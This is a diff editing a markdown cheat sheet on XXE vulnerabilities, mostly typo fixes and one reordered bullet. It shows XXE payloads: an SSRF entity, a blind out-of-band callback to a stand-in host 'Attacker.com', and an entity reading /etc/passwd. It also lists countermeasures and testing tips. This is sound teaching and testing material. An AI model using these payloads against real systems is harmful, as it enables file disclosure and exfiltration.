@@ -1,6 +1,6 @@
 # XML eXternal Entities Vulnerability
 
-XXE is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. (Can be used to to disclose various configuration file information, which the attackers then use to exploit the system further)
+XXE is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. (Can be used to disclose various configuration file information, which the attackers then use to exploit the system further)
 
 ### What are XML External Entities
 - External entity profiles are defined by outside sources such as a file on a local computer or a web URL. Such entities are used to ensure that the XML processor behaves consistently even when unexpected characters are parsed.
@@ -28,10 +28,10 @@ XXE is a web security vulnerability that allows an attacker to interfere with an
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internals.target.com"> ]>
 ```
 - Data out-of-band exfiltration (Blind XXE)
+	- Make a callback to our server.
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://Attacker.com"> ]>
 ```
-	- Make a callback to our server.
 ```xml
 <!DOCTYPE foo [
 	<!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -47,7 +47,7 @@ XXE is a web security vulnerability that allows an attacker to interfere with an
 
 ## Countermeasures:
 
-- Use simple data formats. (JSON as example)
+- Use simple data formats. (JSON as an example)
 - Use updated XML processes and libraries.
 - Disable Document Type Definition and XXE in all XML Parsers.
 - Usage of Whitelisting for Server-Side Input Validation.
@@ -56,7 +56,7 @@ XXE is a web security vulnerability that allows an attacker to interfere with an
 
 ## Takeaways: 
 
-- It'simportant to insert your XXE entity into every single XML element. Any of them can be vulnerable as the developer has to filter ALL the fields indivually.
+- It's important to insert your XXE entity into every single XML element. Any of them can be vulnerable as the developer has to filter ALL the fields individually.
 - Trying to upload a file that will test for XXE on every entry point where an XML
 is processed
 - Look into for SVG/DOC/XLSX & SOAP requests.
